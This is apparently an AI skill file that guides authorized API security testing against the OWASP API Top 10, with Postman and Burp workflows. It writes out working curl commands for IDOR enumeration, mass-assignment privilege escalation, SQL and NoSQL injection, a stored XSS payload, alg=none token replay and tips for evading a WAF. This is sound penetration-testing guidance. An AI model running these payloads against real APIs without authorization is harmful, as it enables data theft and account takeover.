---
name: api-security-testing
description: Use when testing REST, GraphQL, or internal APIs on an
  authorized engagement. Covers the OWASP API Security Top 10 with emphasis
  on broken object level authorization (BOLA/IDOR), mass assignment,
  excessive data exposure, rate limiting, and JWT handling in APIs, plus
  practical Postman 11.x and Burp Suite 2026.2 workflows for mapping,
  fuzzing, and chaining findings. Use when an app exposes JSON endpoints,
  mobile backends, or partner APIs that need systematic security testing.
version: 1.0.0
domain: api
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [web-sqli, web-xss, auth-attacks]
tools:
  - name: Burp Suite
    version: 2026.2
  - name: Postman
    version: 11.x
  - name: Python
    version: 3.12
---

APIs carry the same business logic as web apps but with thinner client side
controls, so authorization and data exposure flaws cluster there. This skill
covers systematic authorized API testing: discovering every endpoint,
testing the OWASP API Top 10 issue by issue, abusing object level
authorization, and running repeatable Postman and Burp workflows. Test only
endpoints in scope, respect rate limits, and never touch production data.

## Quick Workflow

1. Discover endpoints: proxy the web and mobile apps, read OpenAPI or
   Swagger docs, and fuzz for hidden routes.
2. Build an authenticated Postman collection with environments for two
   test users of different roles.
3. Test object level authorization (BOLA/IDOR) on every endpoint that
   takes an ID.
4. Test function level authorization by replaying admin calls as a low
   privilege user.
5. Test mass assignment, excessive data exposure, and injection in
   request bodies.
6. Test rate limiting, resource consumption, and business flow abuse.
7. Test JWT and token handling specific to the API.
8. Chain findings into impact (read another user's data, escalate role)
   and document every request/response pair.

## 1. Discovery and mapping

APIs hide endpoints in JavaScript bundles, mobile apps, and docs. Collect
them all before testing.

```bash
# Proxy traffic through Burp and export the site map, then list API paths
# In Burp: Target > Site map > filter by /api, then save items

# Read the OpenAPI spec when exposed
curl -s 'https://target.example/api/openapi.json' | python3 -c "
import json,sys
spec=json.load(sys.stdin)
for p,ops in spec.get('paths',{}).items():
    print(p, sorted(ops.keys()))
"

# Common doc locations worth probing (in scope only)
for doc in openapi.json swagger.json api-docs v2/api-docs graphql; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "https://target.example/$doc")
  echo "$doc -> $code"
done

# Fuzz for hidden endpoints with a small API wordlist, throttled
ffuf -u 'https://target.example/api/FUZZ' -w /tmp/api-words.txt \
  -t 5 -rate 20 -mc 200,201,204,301,302,400,401,403,422
```

Build a route table: method, path, parameters, auth required, and role.
Update it as you find more; the table drives every later phase.

## 2. Postman and Burp workflow

Use Postman for structured functional testing and Burp for attack
traffic. Keep both in sync through the proxy.

```bash
# Route Postman through Burp so every call is logged and repeatable
# Postman > Settings > Proxy > 127.0.0.1:8080, then import the OpenAPI spec:
# Postman > Import > link or file > openapi.json

# Export the collection for the report and for teammates
# Postman > Collection > Export > collection-v2.1.json
```

In Burp, scope the project to the API host, turn on the logger, and use
Repeater for single-request tests and Intruder (throttled) for ID
enumeration. Save interesting requests as Repeater tabs named after the
finding, so the report writes itself later.

```bash
# Quick authenticated baseline: two users, compare a normal request
curl -s 'https://target.example/api/v1/orders/1001' \
  -H "Authorization: Bearer $USER_A_TOKEN" | head -c 400
curl -s 'https://target.example/api/v1/orders/1001' \
  -H "Authorization: Bearer $USER_B_TOKEN" | head -c 400
```

## 3. BOLA and IDOR (API1:2023)

Broken object level authorization is the top API flaw: the server trusts
the ID in the request without checking ownership.

```bash
# User A reads their own order, then swaps in user B's order ID
curl -s 'https://target.example/api/v1/orders/1001' \
  -H "Authorization: Bearer $USER_A_TOKEN"
curl -s 'https://target.example/api/v1/orders/1002' \
  -H "Authorization: Bearer $USER_A_TOKEN" | head -c 400

# Enumerate IDs with a loop (slow, throttled, in scope)
for id in $(seq 1001 1020); do
  code=$(curl -s -o /tmp/o_$id.json -w '%{http_code}' \
    "https://target.example/api/v1/orders/$id" \
    -H "Authorization: Bearer $USER_A_TOKEN")
  echo "$id -> $code"
done

# Test non-sequential IDs too: UUIDs, hashes (harder to guess, still testable
# when leaked in other responses), and nested IDs (/users/5/orders/9)
```

Test every HTTP method on the object: GET may be protected while PUT or
DELETE is not. Also test ID in the body versus ID in the URL disagreeing
(`PUT /orders/1001` with `{"id": 1002}`), which confuses naive checks.

## 4. Broken function level authorization (API5:2023)

Replay privileged endpoints as a low privilege user.

```bash
# Admin endpoint called with a normal user token
curl -s 'https://target.example/api/v1/admin/users' \
  -H "Authorization: Bearer $USER_B_TOKEN" -w '\nHTTP %{http_code}\n'

# Hidden HTTP methods on the same path
for m in GET POST PUT PATCH DELETE; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X $m \
    'https://target.example/api/v1/admin/users' \
    -H "Authorization: Bearer $USER_B_TOKEN")
  echo "$m -> $code"
done
```

Watch for 403 with a body that still leaks data, and for endpoints that
return 404 to unauthorized users but 200 to admins (the difference itself
confirms the endpoint exists).

## 5. Mass assignment and excessive data exposure

Mass assignment (API3:2023) lets you set fields the client should never
control, like `role` or `is_admin`.

```bash
# Register, then try to escalate through extra fields
curl -s -X POST 'https://target.example/api/v1/users' \
  -H 'Content-Type: application/json' \
  -d '{"name":"tester","email":"t@example.com","pass":"Test123!","role":"admin","is_admin":true}'

# Update profile with guessed privileged fields
curl -s -X PATCH 'https://target.example/api/v1/users/me' \
  -H "Authorization: Bearer $USER_B_TOKEN" -H 'Content-Type: application/json' \
  -d '{"role":"admin"}' | head -c 300

# Excessive data exposure: compare API response to what the UI shows
curl -s 'https://target.example/api/v1/users/me' \
  -H "Authorization: Bearer $USER_B_TOKEN" | python3 -m json.tool | head -40
# Look for: password hashes, internal IDs, tokens, emails, SSNs, debug fields
```

If the API echoes back a `role` field you set, verify it actually took
effect with a privileged call, not just the response text.

## 6. Injection in APIs

APIs take the same injection payloads as web forms, in JSON, query
strings, and headers.

```bash
# SQL injection in a JSON field
curl -s -X POST 'https://target.example/api/v1/search' \
  -H 'Content-Type: application/json' \
  -d '{"q":"test'"'"' AND SLEEP(3)-- -"}' -w '\n%{time_total}s\n'

# NoSQL injection (Mongo-style operators)
curl -s -X POST 'https://target.example/api/v1/login' \
  -H 'Content-Type: application/json' \
  -d '{"user":{"$gt":""},"pass":{"$gt":""}}'

# Stored XSS through API-fed frontends: store, then check the web UI render
curl -s -X POST 'https://target.example/api/v1/comments' \
  -H "Authorization: Bearer $USER_A_TOKEN" -H 'Content-Type: application/json' \
  -d '{"text":"<svg onload=alert(document.domain)>"}'
```

For full SQLi technique coverage (UNION, blind, error-based) use the
web-sqli skill; for XSS contexts use the web-xss skill. This phase is
about finding the injectable API fields.

## 7. Rate limiting and resource consumption (API4:2023)

```bash
# Rate limit test: 50 fast login attempts, watch for 429
for i in $(seq 1 50); do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST \
    'https://target.example/api/v1/login' \
    -H 'Content-Type: application/json' -d '{"user":"a","pass":"b"}'
done | sort | uniq -c

# Expensive operation test (in scope, gentle): deep pagination
curl -s 'https://target.example/api/v1/orders?limit=1000000&page=1' \
  -H "Authorization: Bearer $USER_A_TOKEN" -w '\n%{time_total}s %{size_download}b\n' -o /dev/null

# Batch endpoint abuse: one request that triggers N operations
curl -s -X POST 'https://target.example/api/v1/notify/batch' \
  -H "Authorization: Bearer $USER_A_TOKEN" -H 'Content-Type: application/json' \
  -d '{"ids":[1,2,3,4,5]}' -w '\nHTTP %{http_code}\n'
```

Report missing limits with the request count that proved it, and never
run a real denial of service test.

## 8. JWT and token handling in APIs

```bash
# Check token transport and lifetime
curl -s -D - 'https://target.example/api/v1/users/me' \
  -H "Authorization: Bearer $USER_A_TOKEN" -o /dev/null | grep -i -E 'set-cookie|authorization'

# Replay an expired token, a token with alg=none, and a tampered claim
# (craft tokens with the script from the auth-attacks skill)
curl -s 'https://target.example/api/v1/users/me' \
  -H "Authorization: Bearer $NONE_ALG_TOKEN" -w '\nHTTP %{http_code}\n'

# Scope test: token issued for read-only scope used on a write endpoint
curl -s -X POST 'https://target.example/api/v1/orders' \
  -H "Authorization: Bearer $READ_SCOPE_TOKEN" \
  -H 'Content-Type: application/json' -d '{"item":"x"}' -w '\nHTTP %{http_code}\n'
```

Also verify logout revokes refresh tokens, and that the API rejects
tokens issued for a different audience.

## Edge cases

- The API returns 200 with an error object instead of HTTP error codes.
  Parse the body, not the status, when classifying results.
- IDs are UUIDs. BOLA still applies when UUIDs leak in list responses,
  shared links, or logs; test with leaked values rather than guessing.
- GraphQL is in use. Introspection may be on; test field level
  authorization per type, and batching for rate limit bypass.
- The API versions paths (`/v1`, `/v2`). Old versions often keep old
  flaws; test every version you find.
- Requests need signed parameters or HMAC. Get the signing logic from
  the mobile app or JS bundle in scope before testing further.
- 403 responses differ subtly from 404s. Normalize your comparisons
  (strip timestamps and request IDs) before concluding.

## Escalation

- BOLA enumeration is slow: narrow ID ranges from list endpoints, and
  test a sample across roles instead of the full range.
- WAF blocks fuzzing: reduce rate, rotate user agents, and focus on
  logic flaws (BOLA, mass assignment) which need few requests.
- No docs and no JS bundle: enumerate via the mobile app proxy or
  OPTIONS requests per path to learn allowed methods.
- Auth is mTLS or client certificates: request test certificates from
  the client; do not attempt to bypass certificate validation.
- Findings look low impact alone: chain them (BOLA read plus mass
  assignment write, or excessive data exposure feeding IDOR targets).

## Detection and defender view

Defenders see API attacks as ID enumeration sweeps (sequential IDs from
one token), method tampering on admin paths, mass assignment probes with
`role` or `is_admin` fields, and token replay with modified claims. Good
defenses are per-object authorization checks on every endpoint, strict
input schemas that drop unknown fields, rate limiting per user and per
endpoint, short-lived scoped tokens, and logging the authenticated user
ID with every request for traceability.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- OWASP API Security Top 10 2023: API1 Broken Object Level
  Authorization, API2 Broken Authentication, API3 Broken Object Property
  Level Authorization, API4 Unrestricted Resource Consumption, API5
  Broken Function Level Authorization.
- CWE-639 (Authorization Bypass Through User-Controlled Key),
  CWE-862 (Missing Authorization), CWE-863 (Incorrect Authorization).
- CWE-915 (Improperly Controlled Modification of Object Attributes):
  mass assignment.
- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor):
  excessive data exposure.
- OWASP API Security Project cheat sheets and Postman testing guides.
